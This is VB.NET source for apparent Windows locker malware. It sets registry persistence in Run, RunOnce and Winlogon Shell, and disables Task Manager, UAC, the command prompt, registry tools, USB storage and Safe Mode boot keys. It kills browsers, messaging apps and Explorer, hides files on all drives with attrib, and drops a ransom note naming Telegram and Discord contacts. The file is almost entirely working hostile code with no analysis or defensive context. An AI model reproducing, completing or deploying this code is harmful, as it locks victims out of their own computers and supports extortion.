Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Security.Principal
Imports System.Threading
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32

Public Class loader
    Public string_0 As String()

    Public string_1 As String()

    Public string_2 As String()

    Public string_3 As String

    Public string_4 As String

    Public object_0 As Object

    Public Sub New()
        Me.string_0 = New String() {"D", "H", "Z", "Q", "W", "L", "K", "J", "G", "S", "I", "T", "V", "W", "R", "X", "P", "E", "B", "M", "F"}
        Me.string_1 = New String() {"telegram", "discord", "skype", "zoom", "msedge", "chrome", "opera", "browser", "firefox", "javaw", "steam", "steamwebhelper", "steamservice", "EpicGamesLauncher"}
        Me.string_2 = New String() {"AWindowsService.exe", "taskhost.exe", "windowsx-c.exe", "System.exe", "_default64.exe", "native.exe", "ux-cryptor.exe", "crypt0rsx.exe"}
        Me.string_3 = "attrib $h $s $r $i /D "
        Me.string_4 = Environment.ExpandEnvironmentVariables("%temp%\$unlocker_id.ux-cryptobytes")
        Me.object_0 = False
        InitializeComponent()
    End Sub

    Private Sub loader_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ' The following expression was wrapped in a checked-statement
        Try
            'Dim array As Object() = New Object() {New Class2(), New Class3(), New Class4()}
            'Dim flag As Boolean = True
            'Conversions.ToBoolean(Environment.MachineName.Contains("VPS") OrElse flag = Environment.MachineName.Contains("VDS") OrElse Conversions.ToBoolean(Operators.CompareObjectEqual(flag, NewLateBinding.LateGet(Array(0), Nothing, "VM_Detected", New Object(-1) {}, Nothing, Nothing, Nothing), False)) OrElse Conversions.ToBoolean(Operators.CompareObjectEqual(flag, NewLateBinding.LateGet(Array(1), Nothing, "AnyRun_Detected", New Object(-1) {}, Nothing, Nothing, Nothing), False)) OrElse Conversions.ToBoolean(Operators.CompareObjectEqual(flag, NewLateBinding.LateGet(Array(2), Nothing, "SandBox_Detected", New Object(-1) {}, Nothing, Nothing, Nothing), False)))
            Try
                Dim array2 As RegistryKey() = New RegistryKey() {My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True), My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", True), My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", True)}
                array2(0).SetValue("WindowsInstaller", """" + Application.ExecutablePath + """ -startup")
                array2(0).SetValue("MSEdgeUpdateX", """" + Application.ExecutablePath + """")
                array2(1).SetValue("System3264Wow", """" + Application.ExecutablePath + """ --init")
                array2(1).SetValue("OneDrive10293", """" + Application.ExecutablePath + """ /setup")
                array2(1).SetValue("WINDOWS", """" + Application.ExecutablePath + """ --wininit")
                array2(2).SetValue("Shell", """" + Application.ExecutablePath + """")
                array2(0).Close()
                array2(1).Close()
                array2(2).Close()
            Catch ex As Exception
            End Try
            Try
                Dim registryKey As RegistryKey = Registry.LocalMachine.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System", True)
                Dim registryKey2 As RegistryKey = Registry.LocalMachine.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", True)
                Dim registryKey3 As RegistryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Control\SafeBoot", True)
                Dim registryKey4 As RegistryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\USBSTOR", True)
                Dim registryKey5 As RegistryKey = Registry.LocalMachine.CreateSubKey("Software\Policies\Microsoft\Windows\System", True)
                Dim registryKey6 As RegistryKey = Registry.LocalMachine.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Search", True)
                registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord)
                registryKey.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord)
                registryKey.SetValue("DisableLockWorkStation", 1, RegistryValueKind.DWord)
                registryKey.SetValue("DisableChangePassword", 1, RegistryValueKind.DWord)
                registryKey.SetValue("NoDispBackgroundPage", 1, RegistryValueKind.DWord)
                registryKey.SetValue("NoDispAppearancePage", 1, RegistryValueKind.DWord)
                registryKey.SetValue("consentpromptbehavioradmin", 0, RegistryValueKind.DWord)
                registryKey.SetValue("enablelua", 0, RegistryValueKind.DWord)
                registryKey.SetValue("promptonsecuredesktop", 0, RegistryValueKind.DWord)
                registryKey2.SetValue("StartMenuLogOff", 1, RegistryValueKind.DWord)
                registryKey2.SetValue("NoClose", 1, RegistryValueKind.DWord)
                registryKey2.SetValue("NoControlPanel", 1, RegistryValueKind.DWord)
                registryKey2.SetValue("NoRun", 1, RegistryValueKind.DWord)
                registryKey2.SetValue("NoViewOnDrive", 67108863, RegistryValueKind.DWord)
                registryKey2.SetValue("NoDrives", 67108863, RegistryValueKind.DWord)
                registryKey2.SetValue("HidePowerOptions", 1, RegistryValueKind.DWord)
                registryKey2.SetValue("NoDesktop", 1, RegistryValueKind.DWord)
                registryKey2.SetValue("NoNetHood", 1, RegistryValueKind.DWord)
                registryKey2.SetValue("NoWinKeys", 1, RegistryValueKind.DWord)
                registryKey2.SetValue("NoFolderOptions", 1, RegistryValueKind.DWord)
                registryKey2.SetValue("NoViewContextMenu", 1, RegistryValueKind.DWord)
                registryKey2.SetValue("NoTrayContextMenu", 1, RegistryValueKind.DWord)
                registryKey2.SetValue("NoSetTaskbar", 1, RegistryValueKind.DWord)
                registryKey2.SetValue("NoFind", 1, RegistryValueKind.DWord)
                registryKey2.SetValue("NoSecurityTab", 1, RegistryValueKind.DWord)
                registryKey2.SetValue("NoDesktopContextMenu", 1, RegistryValueKind.DWord)
                registryKey2.SetValue("NoCommonGroups", 1, RegistryValueKind.DWord)
                registryKey2.SetValue("NoFileMenu", 1, RegistryValueKind.DWord)
                registryKey2.SetValue("NoStartMenuMorePrograms", 1, RegistryValueKind.DWord)
                registryKey2.SetValue("NoStartMenuMFUprogramsList", 1, RegistryValueKind.DWord)
                registryKey2.SetValue("NoPropertiesMyComputer", 1, RegistryValueKind.DWord)
                registryKey2.SetValue("NoThemesTab", 1, RegistryValueKind.DWord)
                registryKey3.DeleteSubKeyTree("Minimal", False)
                registryKey3.DeleteSubKeyTree("Network", False)
                registryKey4.SetValue("Start", 4, RegistryValueKind.DWord)
                registryKey5.SetValue("DisableCMD", 1, RegistryValueKind.DWord)
                registryKey6.SetValue("BingSearchEnabled", 0, RegistryValueKind.DWord)
                registryKey6.SetValue("SearchboxTaskbarMode", 0, RegistryValueKind.DWord)
                registryKey.Close()
                registryKey2.Close()
                registryKey3.Close()
                registryKey4.Close()
                registryKey5.Close()
                registryKey6.Close()
            Catch ex2 As Exception
            End Try
            Dim text As String = My.Computer.Info.OSFullName.Trim().ToLower()
            Dim threadd As New Thread(New ParameterizedThreadStart(AddressOf Me.Encryption))
            Dim flag2 As Boolean = True
            If Not text.Contains("10") AndAlso flag2 <> text.Contains("11") Then
                threadd.Start()
            End If
            Try
                Dim num As Integer = 1
                Do
                    My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue("WIN32_" + Conversions.ToString(num), New Random().[Next](100000, 999999))
                    'My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue("MicrosoftEdgeUpdate_" + Conversions.ToString(num), New Random().[Next](100000, 999999))
                    'My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue("AloBiznesDaDaDengi_" + Conversions.ToString(num), New Random().[Next](100000, 999999))
                    'My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue("SimpleUnlockerIdiNaxuy_" + Conversions.ToString(num), New Random().[Next](100000, 999999))
                    'My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue("DaYaEbal_" + Conversions.ToString(num), New Random().[Next](100000, 999999))
                    'My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue("NaGoreUVodopada5GorilEbaliKogoto_" + Conversions.ToString(num), New Random().[Next](100000, 999999))
                    num += 1
                Loop While num <= 256
                Try
                    If Not File.Exists(Me.string_4) Then
                        File.WriteAllText(Me.string_4, DateAndTime.TimeString.Replace(":", Nothing))
                    End If
                Catch ex5 As Exception
                    Me.object_0 = True
                End Try
                Dim num2 As Integer = 0
                For Each screen As Screen In Screen.AllScreens
                    num2 += 1
                    If num2 = 1 Then
                        Dim _o_program As _o_program = New _o_program()
                        Dim workingArea As Rectangle = screen.WorkingArea
                        _o_program.Top = workingArea.Top
                        _o_program.Left = workingArea.Left
                        _o_program.Show()
                        _o_program.Activate()
                    Else
                        Dim empty As empty = New empty()
                        Dim workingArea2 As Rectangle = screen.WorkingArea
                        empty.Top = workingArea2.Top
                        empty.Left = workingArea2.Left
                        empty.Show()
                        empty.Activate()
                    End If
                Next
                method_1()
                method_2()
                Dim processes As Process() = Process.GetProcesses()
                Dim num3 As Integer = Me.string_1.Length - 1
                For j As Integer = 0 To num3
                    Try
                        For Each process As Process In processes
                            If process.ProcessName.ToLower().Contains(Me.string_1(j).ToLower()) Then
                                process.Kill()
                            End If
                        Next
                    Catch ex6 As Exception
                    End Try
                Next
                Return
            Catch ex7 As Exception
                Return
            End Try
            If Not File.Exists(Me.string_4) Then
                File.WriteAllText(Me.string_4, "121212")
            End If
            My.Forms._o_program.Show()
        Catch ex8 As Exception
        End Try
    End Sub

    Public Sub method_1()
        ' The following expression was wrapped in a checked-statement
        Try
            Dim text As String = Me.string_3.Replace("$", "+") + " & echo [%RANDOM%] Ooops! Your files are encrypted! Telegram for contact: @ftmoapp OR discord theallahhimself 1>info-Locker.txt & attrib -h +s +r info-Locker.txt"
            Dim array As String() = New String() {"%userprofile%\desktop", "%systemdrive%\Users\Public\Desktop", "%userprofile%\downloads", "%userprofile%\documents", "%userprofile%"}
            Dim num As Integer = Me.string_0.Length - 1
            For i As Integer = 0 To num
                If Directory.Exists(Me.string_0(i) + ":\") Then
                    Dim text2 As String = Me.string_0(i) + ":"
                    Interaction.Shell("cmd.exe /c " + text2 + " & " + text, AppWinStyle.Hide, False, -1)
                End If
            Next
            Dim num2 As Integer = array.Length - 1
            For j As Integer = 0 To num2
                Interaction.Shell("cmd.exe /c cd """ + array(j) + """&" + text, AppWinStyle.Hide, False, -1)
            Next
        Catch ex As Exception
        End Try
    End Sub

    Public Sub method_2()
        Try
            Interaction.Shell("taskkill.exe /f /im Explorer.exe", AppWinStyle.Hide, False, -1)
        Catch ex As Exception
        End Try
    End Sub

    Private Sub loader_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        e.Cancel = True
    End Sub

    Private Sub method_3()
        Interaction.MsgBox("0xC00000FD: The memory location at the specified address returned ""null""", MsgBoxStyle.OkCancel Or MsgBoxStyle.Critical, Application.ExecutablePath)
        ProjectData.EndApp()
    End Sub

    Private Sub Encryption()
        Dim text As String = "/S *"
        Me.string_3 += text
    End Sub
End Class